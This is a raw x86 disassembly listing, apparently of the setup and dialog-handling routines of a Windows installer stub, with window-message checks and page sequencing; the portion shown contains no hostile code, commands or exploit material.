  403a01:	e8 82 27 00 00       	call   0x406188
  403a06:	66 39 3d 48 02 45 00 	cmp    %di,0x450248
  403a0d:	75 16                	jne    0x403a25
  403a0f:	57                   	push   %edi
  403a10:	53                   	push   %ebx
  403a11:	68 d4 83 40 00       	push   $0x4083d4
  403a16:	68 48 83 40 00       	push   $0x408348
  403a1b:	68 03 00 00 80       	push   $0x80000003
  403a20:	e8 63 27 00 00       	call   0x406188
  403a25:	53                   	push   %ebx
  403a26:	68 00 b0 4d 00       	push   $0x4db000
  403a2b:	e8 a6 28 00 00       	call   0x4062d6
  403a30:	e8 4b 02 00 00       	call   0x403c80
  403a35:	a1 fc ae 47 00       	mov    0x47aefc,%eax
  403a3a:	bd 00 f0 4c 00       	mov    $0x4cf000,%ebp
  403a3f:	83 e0 20             	and    $0x20,%eax
  403a42:	55                   	push   %ebp
  403a43:	a3 80 af 47 00       	mov    %eax,0x47af80
  403a48:	c7 05 9c af 47 00 00 	movl   $0x10000,0x47af9c
  403a4f:	00 01 00 
  403a52:	e8 40 22 00 00       	call   0x405c97
  403a57:	85 c0                	test   %eax,%eax
  403a59:	0f 85 8c 00 00 00    	jne    0x403aeb
  403a5f:	8b 4e 48             	mov    0x48(%esi),%ecx
  403a62:	3b cf                	cmp    %edi,%ecx
  403a64:	0f 84 81 00 00 00    	je     0x403aeb
  403a6a:	8b 56 4c             	mov    0x4c(%esi),%edx
  403a6d:	a1 38 af 47 00       	mov    0x47af38,%eax
  403a72:	bb 80 ae 46 00       	mov    $0x46ae80,%ebx
  403a77:	57                   	push   %edi
  403a78:	8d 14 50             	lea    (%eax,%edx,2),%edx
  403a7b:	53                   	push   %ebx
  403a7c:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  403a7f:	52                   	push   %edx
  403a80:	50                   	push   %eax
  403a81:	ff 76 44             	push   0x44(%esi)
  403a84:	e8 ff 26 00 00       	call   0x406188
  403a89:	66 a1 80 ae 46 00    	mov    0x46ae80,%ax
  403a8f:	66 3b c7             	cmp    %di,%ax
  403a92:	74 57                	je     0x403aeb
  403a94:	66 3d 22 00          	cmp    $0x22,%ax
  403a98:	75 10                	jne    0x403aaa
  403a9a:	bb 82 ae 46 00       	mov    $0x46ae82,%ebx
  403a9f:	6a 22                	push   $0x22
  403aa1:	53                   	push   %ebx
  403aa2:	e8 15 21 00 00       	call   0x405bbc
  403aa7:	66 89 38             	mov    %di,(%eax)
  403aaa:	53                   	push   %ebx
  403aab:	e8 20 28 00 00       	call   0x4062d0
  403ab0:	8d 44 43 f8          	lea    -0x8(%ebx,%eax,2),%eax
  403ab4:	3b c3                	cmp    %ebx,%eax
  403ab6:	76 26                	jbe    0x403ade
  403ab8:	68 88 a3 40 00       	push   $0x40a388
  403abd:	50                   	push   %eax
  403abe:	ff 15 04 81 40 00    	call   *0x408104
  403ac4:	85 c0                	test   %eax,%eax
  403ac6:	75 16                	jne    0x403ade
  403ac8:	53                   	push   %ebx
  403ac9:	ff 15 94 80 40 00    	call   *0x408094
  403acf:	83 f8 ff             	cmp    $0xffffffff,%eax
  403ad2:	74 04                	je     0x403ad8
  403ad4:	a8 10                	test   $0x10,%al
  403ad6:	75 06                	jne    0x403ade
  403ad8:	53                   	push   %ebx
  403ad9:	e8 fd 20 00 00       	call   0x405bdb
  403ade:	53                   	push   %ebx
  403adf:	e8 ab 20 00 00       	call   0x405b8f
  403ae4:	50                   	push   %eax
  403ae5:	55                   	push   %ebp
  403ae6:	e8 cf 27 00 00       	call   0x4062ba
  403aeb:	55                   	push   %ebp
  403aec:	e8 a6 21 00 00       	call   0x405c97
  403af1:	85 c0                	test   %eax,%eax
  403af3:	75 0c                	jne    0x403b01
  403af5:	ff b6 18 01 00 00    	push   0x118(%esi)
  403afb:	55                   	push   %ebp
  403afc:	e8 db 27 00 00       	call   0x4062dc
  403b01:	68 40 80 00 00       	push   $0x8040
  403b06:	57                   	push   %edi
  403b07:	57                   	push   %edi
  403b08:	6a 01                	push   $0x1
  403b0a:	6a 67                	push   $0x67
  403b0c:	ff 35 e0 ae 47 00    	push   0x47aee0
  403b12:	ff 15 60 82 40 00    	call   *0x408260
  403b18:	a3 c8 2e 47 00       	mov    %eax,0x472ec8
  403b1d:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403b21:	bb 80 2e 47 00       	mov    $0x472e80,%ebx
  403b26:	74 7f                	je     0x403ba7
  403b28:	8b 0d e0 ae 47 00    	mov    0x47aee0,%ecx
  403b2e:	be 80 a3 40 00       	mov    $0x40a380,%esi
  403b33:	53                   	push   %ebx
  403b34:	c7 05 84 2e 47 00 00 	movl   $0x401000,0x472e84
  403b3b:	10 40 00 
  403b3e:	89 0d 90 2e 47 00    	mov    %ecx,0x472e90
  403b44:	a3 94 2e 47 00       	mov    %eax,0x472e94
  403b49:	89 35 a4 2e 47 00    	mov    %esi,0x472ea4
  403b4f:	ff 15 34 82 40 00    	call   *0x408234
  403b55:	66 85 c0             	test   %ax,%ax
  403b58:	0f 84 18 01 00 00    	je     0x403c76
  403b5e:	8d 44 24 10          	lea    0x10(%esp),%eax
  403b62:	57                   	push   %edi
  403b63:	50                   	push   %eax
  403b64:	57                   	push   %edi
  403b65:	6a 30                	push   $0x30
  403b67:	ff 15 38 82 40 00    	call   *0x408238
  403b6d:	57                   	push   %edi
  403b6e:	ff 35 e0 ae 47 00    	push   0x47aee0
  403b74:	8b 44 24 24          	mov    0x24(%esp),%eax
  403b78:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  403b7c:	57                   	push   %edi
  403b7d:	57                   	push   %edi
  403b7e:	50                   	push   %eax
  403b7f:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403b83:	2b 44 24 24          	sub    0x24(%esp),%eax
  403b87:	50                   	push   %eax
  403b88:	ff 74 24 2c          	push   0x2c(%esp)
  403b8c:	ff 74 24 2c          	push   0x2c(%esp)
  403b90:	68 00 00 00 80       	push   $0x80000000
  403b95:	57                   	push   %edi
  403b96:	56                   	push   %esi
  403b97:	68 80 00 00 00       	push   $0x80
  403b9c:	ff 15 3c 82 40 00    	call   *0x40823c
  403ba2:	a3 28 02 45 00       	mov    %eax,0x450228
  403ba7:	57                   	push   %edi
  403ba8:	e8 5e d8 ff ff       	call   0x40140b
  403bad:	85 c0                	test   %eax,%eax
  403baf:	74 08                	je     0x403bb9
  403bb1:	6a 02                	push   $0x2
  403bb3:	58                   	pop    %eax
  403bb4:	e9 bf 00 00 00       	jmp    0x403c78
  403bb9:	e8 c2 00 00 00       	call   0x403c80
  403bbe:	39 3d a0 af 47 00    	cmp    %edi,0x47afa0
  403bc4:	0f 85 83 00 00 00    	jne    0x403c4d
  403bca:	6a 05                	push   $0x5
  403bcc:	ff 35 28 02 45 00    	push   0x450228
  403bd2:	ff 15 68 82 40 00    	call   *0x408268
  403bd8:	68 3c 83 40 00       	push   $0x40833c
  403bdd:	e8 42 2a 00 00       	call   0x406624
  403be2:	85 c0                	test   %eax,%eax
  403be4:	75 0a                	jne    0x403bf0
  403be6:	68 30 83 40 00       	push   $0x408330
  403beb:	e8 34 2a 00 00       	call   0x406624
  403bf0:	8b 35 40 82 40 00    	mov    0x408240,%esi
  403bf6:	bd 18 83 40 00       	mov    $0x408318,%ebp
  403bfb:	53                   	push   %ebx
  403bfc:	55                   	push   %ebp
  403bfd:	57                   	push   %edi
  403bfe:	ff d6                	call   *%esi
  403c00:	85 c0                	test   %eax,%eax
  403c02:	75 16                	jne    0x403c1a
  403c04:	53                   	push   %ebx
  403c05:	68 04 83 40 00       	push   $0x408304
  403c0a:	57                   	push   %edi
  403c0b:	ff d6                	call   *%esi
  403c0d:	53                   	push   %ebx
  403c0e:	89 2d a4 2e 47 00    	mov    %ebp,0x472ea4
  403c14:	ff 15 34 82 40 00    	call   *0x408234
  403c1a:	a1 c0 2e 47 00       	mov    0x472ec0,%eax
  403c1f:	57                   	push   %edi
  403c20:	83 c0 69             	add    $0x69,%eax
  403c23:	68 58 3d 40 00       	push   $0x403d58
  403c28:	0f b7 c0             	movzwl %ax,%eax
  403c2b:	57                   	push   %edi
  403c2c:	50                   	push   %eax
  403c2d:	ff 35 e0 ae 47 00    	push   0x47aee0
  403c33:	ff 15 44 82 40 00    	call   *0x408244
  403c39:	6a 05                	push   $0x5
  403c3b:	8b f0                	mov    %eax,%esi
  403c3d:	e8 c9 d7 ff ff       	call   0x40140b
  403c42:	6a 01                	push   $0x1
  403c44:	e8 b1 fc ff ff       	call   0x4038fa
  403c49:	8b c6                	mov    %esi,%eax
  403c4b:	eb 2b                	jmp    0x403c78
  403c4d:	57                   	push   %edi
  403c4e:	e8 a2 17 00 00       	call   0x4053f5
  403c53:	85 c0                	test   %eax,%eax
  403c55:	74 18                	je     0x403c6f
  403c57:	39 3d ac 2e 47 00    	cmp    %edi,0x472eac
  403c5d:	0f 85 4e ff ff ff    	jne    0x403bb1
  403c63:	6a 02                	push   $0x2
  403c65:	e8 a1 d7 ff ff       	call   0x40140b
  403c6a:	e9 42 ff ff ff       	jmp    0x403bb1
  403c6f:	6a 01                	push   $0x1
  403c71:	e8 95 d7 ff ff       	call   0x40140b
  403c76:	33 c0                	xor    %eax,%eax
  403c78:	5f                   	pop    %edi
  403c79:	5e                   	pop    %esi
  403c7a:	5d                   	pop    %ebp
  403c7b:	5b                   	pop    %ebx
  403c7c:	83 c4 10             	add    $0x10,%esp
  403c7f:	c3                   	ret
  403c80:	53                   	push   %ebx
  403c81:	55                   	push   %ebp
  403c82:	56                   	push   %esi
  403c83:	57                   	push   %edi
  403c84:	bf 00 b0 4d 00       	mov    $0x4db000,%edi
  403c89:	bb ff ff 00 00       	mov    $0xffff,%ebx
  403c8e:	57                   	push   %edi
  403c8f:	e8 86 25 00 00       	call   0x40621a
  403c94:	8b 35 44 af 47 00    	mov    0x47af44,%esi
  403c9a:	85 f6                	test   %esi,%esi
  403c9c:	74 45                	je     0x403ce3
  403c9e:	8b 0d f4 ae 47 00    	mov    0x47aef4,%ecx
  403ca4:	8b 49 64             	mov    0x64(%ecx),%ecx
  403ca7:	8b d1                	mov    %ecx,%edx
  403ca9:	0f af ce             	imul   %esi,%ecx
  403cac:	f7 da                	neg    %edx
  403cae:	03 0d 40 af 47 00    	add    0x47af40,%ecx
  403cb4:	03 ca                	add    %edx,%ecx
  403cb6:	4e                   	dec    %esi
  403cb7:	66 8b 29             	mov    (%ecx),%bp
  403cba:	66 33 e8             	xor    %ax,%bp
  403cbd:	23 eb                	and    %ebx,%ebp
  403cbf:	66 85 ed             	test   %bp,%bp
  403cc2:	74 06                	je     0x403cca
  403cc4:	85 f6                	test   %esi,%esi
  403cc6:	75 ec                	jne    0x403cb4
  403cc8:	eb 19                	jmp    0x403ce3
  403cca:	8b 51 02             	mov    0x2(%ecx),%edx
  403ccd:	89 15 c0 2e 47 00    	mov    %edx,0x472ec0
  403cd3:	8b 51 06             	mov    0x6(%ecx),%edx
  403cd6:	89 15 a8 af 47 00    	mov    %edx,0x47afa8
  403cdc:	8d 51 0a             	lea    0xa(%ecx),%edx
  403cdf:	85 d2                	test   %edx,%edx
  403ce1:	75 12                	jne    0x403cf5
  403ce3:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403ce8:	75 07                	jne    0x403cf1
  403cea:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  403cef:	eb a3                	jmp    0x403c94
  403cf1:	33 db                	xor    %ebx,%ebx
  403cf3:	eb 9f                	jmp    0x403c94
  403cf5:	89 15 bc 2e 47 00    	mov    %edx,0x472ebc
  403cfb:	0f b7 01             	movzwl (%ecx),%eax
  403cfe:	50                   	push   %eax
  403cff:	57                   	push   %edi
  403d00:	e8 fc 24 00 00       	call   0x406201
  403d05:	e8 2f 00 00 00       	call   0x403d39
  403d0a:	a1 2c af 47 00       	mov    0x47af2c,%eax
  403d0f:	8b 35 28 af 47 00    	mov    0x47af28,%esi
  403d15:	85 c0                	test   %eax,%eax
  403d17:	74 1b                	je     0x403d34
  403d19:	8b f8                	mov    %eax,%edi
  403d1b:	8b 06                	mov    (%esi),%eax
  403d1d:	85 c0                	test   %eax,%eax
  403d1f:	74 0a                	je     0x403d2b
  403d21:	50                   	push   %eax
  403d22:	8d 46 18             	lea    0x18(%esi),%eax
  403d25:	50                   	push   %eax
  403d26:	e8 b1 25 00 00       	call   0x4062dc
  403d2b:	81 c6 18 40 00 00    	add    $0x4018,%esi
  403d31:	4f                   	dec    %edi
  403d32:	75 e7                	jne    0x403d1b
  403d34:	5f                   	pop    %edi
  403d35:	5e                   	pop    %esi
  403d36:	5d                   	pop    %ebp
  403d37:	5b                   	pop    %ebx
  403d38:	c3                   	ret
  403d39:	56                   	push   %esi
  403d3a:	be e0 2e 47 00       	mov    $0x472ee0,%esi
  403d3f:	6a fe                	push   $0xfffffffe
  403d41:	56                   	push   %esi
  403d42:	e8 95 25 00 00       	call   0x4062dc
  403d47:	56                   	push   %esi
  403d48:	ff 35 28 02 45 00    	push   0x450228
  403d4e:	ff 15 5c 82 40 00    	call   *0x40825c
  403d54:	8b c6                	mov    %esi,%eax
  403d56:	5e                   	pop    %esi
  403d57:	c3                   	ret
  403d58:	83 ec 10             	sub    $0x10,%esp
  403d5b:	b9 10 01 00 00       	mov    $0x110,%ecx
  403d60:	53                   	push   %ebx
  403d61:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  403d65:	55                   	push   %ebp
  403d66:	56                   	push   %esi
  403d67:	3b d9                	cmp    %ecx,%ebx
  403d69:	57                   	push   %edi
  403d6a:	0f 84 3b 01 00 00    	je     0x403eab
  403d70:	81 fb 08 04 00 00    	cmp    $0x408,%ebx
  403d76:	0f 84 2f 01 00 00    	je     0x403eab
  403d7c:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403d80:	33 ed                	xor    %ebp,%ebp
  403d82:	83 fb 47             	cmp    $0x47,%ebx
  403d85:	75 13                	jne    0x403d9a
  403d87:	6a 13                	push   $0x13
  403d89:	55                   	push   %ebp
  403d8a:	55                   	push   %ebp
  403d8b:	55                   	push   %ebp
  403d8c:	55                   	push   %ebp
  403d8d:	57                   	push   %edi
  403d8e:	ff 35 28 02 45 00    	push   0x450228
  403d94:	ff 15 a4 81 40 00    	call   *0x4081a4
  403d9a:	83 fb 05             	cmp    $0x5,%ebx
  403d9d:	75 18                	jne    0x403db7
  403d9f:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403da3:	48                   	dec    %eax
  403da4:	f7 d8                	neg    %eax
  403da6:	1b c0                	sbb    %eax,%eax
  403da8:	23 c3                	and    %ebx,%eax
  403daa:	50                   	push   %eax
  403dab:	ff 35 28 02 45 00    	push   0x450228
  403db1:	ff 15 68 82 40 00    	call   *0x408268
  403db7:	81 fb 0d 04 00 00    	cmp    $0x40d,%ebx
  403dbd:	75 1a                	jne    0x403dd9
  403dbf:	ff 35 b8 2e 47 00    	push   0x472eb8
  403dc5:	ff 15 50 82 40 00    	call   *0x408250
  403dcb:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403dcf:	a3 b8 2e 47 00       	mov    %eax,0x472eb8
  403dd4:	e9 02 04 00 00       	jmp    0x4041db
  403dd9:	83 fb 11             	cmp    $0x11,%ebx
  403ddc:	75 11                	jne    0x403def
  403dde:	55                   	push   %ebp
  403ddf:	55                   	push   %ebp
  403de0:	57                   	push   %edi
  403de1:	ff 15 70 82 40 00    	call   *0x408270
  403de7:	33 c0                	xor    %eax,%eax
  403de9:	40                   	inc    %eax
  403dea:	e9 11 04 00 00       	jmp    0x404200
  403def:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  403df5:	0f 85 9d 00 00 00    	jne    0x403e98
  403dfb:	0f b7 74 24 2c       	movzwl 0x2c(%esp),%esi
  403e00:	56                   	push   %esi
  403e01:	57                   	push   %edi
  403e02:	ff 15 e4 81 40 00    	call   *0x4081e4
  403e08:	8b f8                	mov    %eax,%edi
  403e0a:	3b fd                	cmp    %ebp,%edi
  403e0c:	74 1d                	je     0x403e2b
  403e0e:	55                   	push   %ebp
  403e0f:	55                   	push   %ebp
  403e10:	68 f3 00 00 00       	push   $0xf3
  403e15:	57                   	push   %edi
  403e16:	ff 15 18 82 40 00    	call   *0x408218
  403e1c:	57                   	push   %edi
  403e1d:	ff 15 a0 81 40 00    	call   *0x4081a0
  403e23:	85 c0                	test   %eax,%eax
  403e25:	0f 84 d3 03 00 00    	je     0x4041fe
  403e2b:	83 fe 01             	cmp    $0x1,%esi
  403e2e:	75 03                	jne    0x403e33
  403e30:	56                   	push   %esi
  403e31:	eb 2e                	jmp    0x403e61
  403e33:	83 fe 03             	cmp    $0x3,%esi
  403e36:	75 0c                	jne    0x403e44
  403e38:	39 2d 68 a3 40 00    	cmp    %ebp,0x40a368
  403e3e:	7e 3f                	jle    0x403e7f
  403e40:	6a ff                	push   $0xffffffff
  403e42:	eb 1d                	jmp    0x403e61
  403e44:	6a 02                	push   $0x2
  403e46:	5f                   	pop    %edi
  403e47:	3b f7                	cmp    %edi,%esi
  403e49:	75 34                	jne    0x403e7f
  403e4b:	39 2d 8c af 47 00    	cmp    %ebp,0x47af8c
  403e51:	74 15                	je     0x403e68
  403e53:	57                   	push   %edi
  403e54:	e8 b2 d5 ff ff       	call   0x40140b
  403e59:	89 3d 18 42 44 00    	mov    %edi,0x444218
  403e5f:	6a 78                	push   $0x78
  403e61:	e8 a4 03 00 00       	call   0x40420a
  403e66:	eb 30                	jmp    0x403e98
  403e68:	6a 03                	push   $0x3
  403e6a:	e8 9c d5 ff ff       	call   0x40140b
  403e6f:	85 c0                	test   %eax,%eax
  403e71:	75 25                	jne    0x403e98
  403e73:	c7 05 18 42 44 00 01 	movl   $0x1,0x444218
  403e7a:	00 00 00 
  403e7d:	eb e0                	jmp    0x403e5f
  403e7f:	ff 74 24 30          	push   0x30(%esp)
  403e83:	ff 74 24 30          	push   0x30(%esp)
  403e87:	68 11 01 00 00       	push   $0x111
  403e8c:	ff 35 b8 2e 47 00    	push   0x472eb8
  403e92:	ff 15 18 82 40 00    	call   *0x408218
  403e98:	ff 74 24 30          	push   0x30(%esp)
  403e9c:	ff 74 24 30          	push   0x30(%esp)
  403ea0:	53                   	push   %ebx
  403ea1:	e8 f2 03 00 00       	call   0x404298
  403ea6:	e9 55 03 00 00       	jmp    0x404200
  403eab:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403eaf:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403eb3:	3b d9                	cmp    %ecx,%ebx
  403eb5:	a3 30 02 45 00       	mov    %eax,0x450230
  403eba:	75 4d                	jne    0x403f09
  403ebc:	8b 35 e4 81 40 00    	mov    0x4081e4,%esi
  403ec2:	6a 01                	push   $0x1
  403ec4:	57                   	push   %edi
  403ec5:	89 3d e8 ae 47 00    	mov    %edi,0x47aee8
  403ecb:	ff d6                	call   *%esi
  403ecd:	6a 02                	push   $0x2
  403ecf:	57                   	push   %edi
  403ed0:	a3 44 02 45 00       	mov    %eax,0x450244
  403ed5:	ff d6                	call   *%esi
  403ed7:	6a ff                	push   $0xffffffff
  403ed9:	6a 1c                	push   $0x1c
  403edb:	57                   	push   %edi
  403edc:	a3 10 02 44 00       	mov    %eax,0x440210
  403ee1:	e8 4b 03 00 00       	call   0x404231
  403ee6:	ff 35 c8 2e 47 00    	push   0x472ec8
  403eec:	6a f2                	push   $0xfffffff2
  403eee:	57                   	push   %edi
  403eef:	ff 15 98 81 40 00    	call   *0x408198
  403ef5:	6a 04                	push   $0x4
  403ef7:	e8 0f d5 ff ff       	call   0x40140b
  403efc:	a3 ac 2e 47 00       	mov    %eax,0x472eac
  403f01:	33 c0                	xor    %eax,%eax
  403f03:	40                   	inc    %eax
  403f04:	a3 30 02 45 00       	mov    %eax,0x450230
  403f09:	8b 0d 68 a3 40 00    	mov    0x40a368,%ecx
  403f0f:	33 ed                	xor    %ebp,%ebp
  403f11:	8b f1                	mov    %ecx,%esi
  403f13:	c1 e6 06             	shl    $0x6,%esi
  403f16:	03 35 20 af 47 00    	add    0x47af20,%esi
  403f1c:	3b cd                	cmp    %ebp,%ecx
  403f1e:	7c 3e                	jl     0x403f5e
  403f20:	83 f8 01             	cmp    $0x1,%eax
  403f23:	75 31                	jne    0x403f56
  403f25:	55                   	push   %ebp
  403f26:	ff 76 10             	push   0x10(%esi)
  403f29:	e8 5b d4 ff ff       	call   0x401389
  403f2e:	85 c0                	test   %eax,%eax
  403f30:	74 24                	je     0x403f56
  403f32:	6a 01                	push   $0x1
  403f34:	55                   	push   %ebp
  403f35:	68 0f 04 00 00       	push   $0x40f
  403f3a:	ff 35 b8 2e 47 00    	push   0x472eb8
  403f40:	ff 15 18 82 40 00    	call   *0x408218
  403f46:	33 c0                	xor    %eax,%eax
  403f48:	39 2d ac 2e 47 00    	cmp    %ebp,0x472eac
  403f4e:	0f 94 c0             	sete   %al
  403f51:	e9 aa 02 00 00       	jmp    0x404200
  403f56:	39 2e                	cmp    %ebp,(%esi)
  403f58:	0f 84 a0 02 00 00    	je     0x4041fe
  403f5e:	68 0b 04 00 00       	push   $0x40b
  403f63:	e8 15 03 00 00       	call   0x40427d
  403f68:	a1 30 02 45 00       	mov    0x450230,%eax
  403f6d:	01 05 68 a3 40 00    	add    %eax,0x40a368
  403f73:	c1 e0 06             	shl    $0x6,%eax
  403f76:	03 f0                	add    %eax,%esi
  403f78:	a1 68 a3 40 00       	mov    0x40a368,%eax
  403f7d:	3b 05 24 af 47 00    	cmp    0x47af24,%eax
  403f83:	75 07                	jne    0x403f8c
  403f85:	6a 01                	push   $0x1
  403f87:	e8 7f d4 ff ff       	call   0x40140b
  403f8c:	39 2d ac 2e 47 00    	cmp    %ebp,0x472eac
  403f92:	0f 85 24 02 00 00    	jne    0x4041bc
  403f98:	a1 24 af 47 00       	mov    0x47af24,%eax
  403f9d:	39 05 68 a3 40 00    	cmp    %eax,0x40a368
  403fa3:	0f 83 13 02 00 00    	jae    0x4041bc
  403fa9:	ff 76 24             	push   0x24(%esi)
  403fac:	8b 5e 14             	mov    0x14(%esi),%ebx
  403faf:	68 00 30 4f 00       	push   $0x4f3000
  403fb4:	e8 23 23 00 00       	call   0x4062dc
  403fb9:	ff 76 20             	push   0x20(%esi)
  403fbc:	68 19 fc ff ff       	push   $0xfffffc19
  403fc1:	57                   	push   %edi
  403fc2:	e8 6a 02 00 00       	call   0x404231
  403fc7:	ff 76 1c             	push   0x1c(%esi)
  403fca:	68 1b fc ff ff       	push   $0xfffffc1b
  403fcf:	57                   	push   %edi
  403fd0:	e8 5c 02 00 00       	call   0x404231
  403fd5:	ff 76 28             	push   0x28(%esi)
  403fd8:	68 1a fc ff ff       	push   $0xfffffc1a
  403fdd:	57                   	push   %edi
  403fde:	e8 4e 02 00 00       	call   0x404231
  403fe3:	6a 03                	push   $0x3
  403fe5:	57                   	push   %edi
  403fe6:	ff 15 e4 81 40 00    	call   *0x4081e4
  403fec:	39 2d 8c af 47 00    	cmp    %ebp,0x47af8c
  403ff2:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  403ff6:	74 08                	je     0x404000
  403ff8:	66 81 e3 fd fe       	and    $0xfefd,%bx
  403ffd:	83 cb 04             	or     $0x4,%ebx
  404000:	8b cb                	mov    %ebx,%ecx
  404002:	83 e1 08             	and    $0x8,%ecx
  404005:	51                   	push   %ecx
  404006:	50                   	push   %eax
  404007:	ff 15 68 82 40 00    	call   *0x408268
  40400d:	8b c3                	mov    %ebx,%eax
  40400f:	25 00 01 00 00       	and    $0x100,%eax
  404014:	50                   	push   %eax
  404015:	ff 74 24 30          	push   0x30(%esp)
  404019:	ff 15 10 82 40 00    	call   *0x408210
  40401f:	8b c3                	mov    %ebx,%eax
  404021:	83 e0 02             	and    $0x2,%eax
  404024:	50                   	push   %eax
  404025:	e8 29 02 00 00       	call   0x404253
  40402a:	83 e3 04             	and    $0x4,%ebx
  40402d:	53                   	push   %ebx
  40402e:	ff 35 10 02 44 00    	push   0x440210
  404034:	ff 15 10 82 40 00    	call   *0x408210
  40403a:	3b dd                	cmp    %ebp,%ebx
  40403c:	74 03                	je     0x404041
  40403e:	55                   	push   %ebp
  40403f:	eb 02                	jmp    0x404043
  404041:	6a 01                	push   $0x1
  404043:	68 60 f0 00 00       	push   $0xf060
  404048:	55                   	push   %ebp
  404049:	57                   	push   %edi
  40404a:	ff 15 94 81 40 00    	call   *0x408194
  404050:	50                   	push   %eax
  404051:	ff 15 9c 81 40 00    	call   *0x40819c
  404057:	8b 1d 18 82 40 00    	mov    0x408218,%ebx
  40405d:	6a 01                	push   $0x1
  40405f:	55                   	push   %ebp
  404060:	68 f4 00 00 00       	push   $0xf4
  404065:	ff 74 24 38          	push   0x38(%esp)
  404069:	ff d3                	call   *%ebx
  40406b:	39 2d 8c af 47 00    	cmp    %ebp,0x47af8c
  404071:	74 13                	je     0x404086
  404073:	55                   	push   %ebp
  404074:	6a 02                	push   $0x2
  404076:	68 01 04 00 00       	push   $0x401
  40407b:	57                   	push   %edi
  40407c:	ff d3                	call   *%ebx
  40407e:	ff 35 10 02 44 00    	push   0x440210
  404084:	eb 06                	jmp    0x40408c
  404086:	ff 35 44 02 45 00    	push   0x450244
  40408c:	e8 d5 01 00 00       	call   0x404266
  404091:	e8 a3 fc ff ff       	call   0x403d39
  404096:	bb 48 02 45 00       	mov    $0x450248,%ebx
  40409b:	50                   	push   %eax
  40409c:	53                   	push   %ebx
  40409d:	e8 18 22 00 00       	call   0x4062ba
  4040a2:	ff 76 18             	push   0x18(%esi)
  4040a5:	53                   	push   %ebx
  4040a6:	e8 25 22 00 00       	call   0x4062d0
  4040ab:	8d 04 45 48 02 45 00 	lea    0x450248(,%eax,2),%eax
  4040b2:	50                   	push   %eax
  4040b3:	e8 24 22 00 00       	call   0x4062dc
  4040b8:	53                   	push   %ebx
  4040b9:	57                   	push   %edi
  4040ba:	ff 15 5c 82 40 00    	call   *0x40825c
  4040c0:	55                   	push   %ebp
  4040c1:	ff 76 08             	push   0x8(%esi)
  4040c4:	e8 c0 d2 ff ff       	call   0x401389
  4040c9:	85 c0                	test   %eax,%eax
  4040cb:	0f 85 97 fe ff ff    	jne    0x403f68
  4040d1:	39 2e                	cmp    %ebp,(%esi)
  4040d3:	0f 84 8f fe ff ff    	je     0x403f68
  4040d9:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  4040dd:	75 1d                	jne    0x4040fc
  4040df:	39 2d 8c af 47 00    	cmp    %ebp,0x47af8c
  4040e5:	0f 85 13 01 00 00    	jne    0x4041fe
  4040eb:	39 2d 80 af 47 00    	cmp    %ebp,0x47af80
  4040f1:	0f 85 71 fe ff ff    	jne    0x403f68
  4040f7:	e9 02 01 00 00       	jmp    0x4041fe
  4040fc:	ff 35 b8 2e 47 00    	push   0x472eb8
  404102:	ff 15 50 82 40 00    	call   *0x408250
  404108:	89 35 20 82 44 00    	mov    %esi,0x448220
  40410e:	39 2e                	cmp    %ebp,(%esi)
  404110:	0f 8e c5 00 00 00    	jle    0x4041db
  404116:	8b 46 04             	mov    0x4(%esi),%eax
  404119:	56                   	push   %esi
  40411a:	ff 34 85 6c a3 40 00 	push   0x40a36c(,%eax,4)
  404121:	66 8b 06             	mov    (%esi),%ax
  404124:	66 03 05 c0 2e 47 00 	add    0x472ec0,%ax
  40412b:	57                   	push   %edi
  40412c:	0f b7 c0             	movzwl %ax,%eax
  40412f:	50                   	push   %eax
  404130:	ff 35 e0 ae 47 00    	push   0x47aee0
  404136:	ff 15 88 82 40 00    	call   *0x408288
  40413c:	3b c5                	cmp    %ebp,%eax
  40413e:	a3 b8 2e 47 00       	mov    %eax,0x472eb8
  404143:	0f 84 92 00 00 00    	je     0x4041db
  404149:	ff 76 2c             	push   0x2c(%esi)
  40414c:	6a 06                	push   $0x6
  40414e:	50                   	push   %eax
  40414f:	e8 dd 00 00 00       	call   0x404231
  404154:	8d 44 24 10          	lea    0x10(%esp),%eax
  404158:	50                   	push   %eax
  404159:	68 fa 03 00 00       	push   $0x3fa
  40415e:	57                   	push   %edi
  40415f:	ff 15 e4 81 40 00    	call   *0x4081e4
  404165:	50                   	push   %eax
  404166:	ff 15 e0 81 40 00    	call   *0x4081e0
  40416c:	8d 44 24 10          	lea    0x10(%esp),%eax
  404170:	50                   	push   %eax
  404171:	57                   	push   %edi
  404172:	ff 15 dc 81 40 00    	call   *0x4081dc
  404178:	6a 15                	push   $0x15
  40417a:	55                   	push   %ebp
  40417b:	55                   	push   %ebp
  40417c:	ff 74 24 20          	push   0x20(%esp)
  404180:	ff 74 24 20          	push   0x20(%esp)
  404184:	55                   	push   %ebp
  404185:	ff 35 b8 2e 47 00    	push   0x472eb8
  40418b:	ff 15 a4 81 40 00    	call   *0x4081a4
  404191:	55                   	push   %ebp
  404192:	ff 76 0c             	push   0xc(%esi)
  404195:	e8 ef d1 ff ff       	call   0x401389
  40419a:	39 2d ac 2e 47 00    	cmp    %ebp,0x472eac
  4041a0:	75 5c                	jne    0x4041fe
  4041a2:	6a 08                	push   $0x8
  4041a4:	ff 35 b8 2e 47 00    	push   0x472eb8
  4041aa:	ff 15 68 82 40 00    	call   *0x408268
  4041b0:	68 05 04 00 00       	push   $0x405
  4041b5:	e8 c3 00 00 00       	call   0x40427d
  4041ba:	eb 1f                	jmp    0x4041db
  4041bc:	ff 35 b8 2e 47 00    	push   0x472eb8
  4041c2:	ff 15 50 82 40 00    	call   *0x408250
  4041c8:	ff 35 18 42 44 00    	push   0x444218
  4041ce:	89 2d e8 ae 47 00    	mov    %ebp,0x47aee8
  4041d4:	57                   	push   %edi
  4041d5:	ff 15 30 82 40 00    	call   *0x408230
  4041db:	39 2d 48 02 46 00    	cmp    %ebp,0x460248
